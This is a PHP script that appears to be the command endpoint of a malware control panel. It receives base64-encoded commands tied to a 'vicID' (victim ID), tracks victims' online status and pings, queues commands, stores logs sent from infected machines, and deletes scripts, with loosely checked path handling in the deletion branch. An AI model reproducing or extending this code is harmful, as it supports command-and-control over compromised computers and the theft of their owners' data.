<?php
include_once 'classes/Database.php';
include_once 'classes/Clients.php';
include_once 'classes/Utils.php';

$utils = new Utils;

$client = new Clients;

$command = $utils->sanitize($utils->base64_decode_url($_GET['command']));
$ID = $utils->sanitize($utils->base64_decode_url($_GET['vicID']));
$data = $client->getClient($ID);

$A = explode("|BN|", $utils->sanitize($command));

switch ($A[0]) {
    case "Uninstall":
        $client->removeClient($ID);
        break;

    case "CleanCommands":
        $client->updateCommands($ID, $utils->base64_encode_url("Ping"));
        break;

    case "Offline":
        $client->updateStatus($ID, "Offline");
        break;

    case "Online":
        $client->updateStatus($ID, "Online");
        break;

    case 'Ping':
        $client->updateCommands($ID, $utils->base64_encode_url("Ping"));
        $client->pinged($ID, $data->pings);
        break;

    case 'DeleteScript':
        try {
            $script_name = stripcslashes(trim($A[1], ".."));
            @unlink(realpath($utils->sanitize("scripts/" . $script_name)));
        } catch (Exception $e) {
        }
        break;
    case "NewLog":
        $client->new_log($ID, $utils->sanitize($A[1]), $utils->sanitize($A[2]));
        break;
    default:
        break;
}
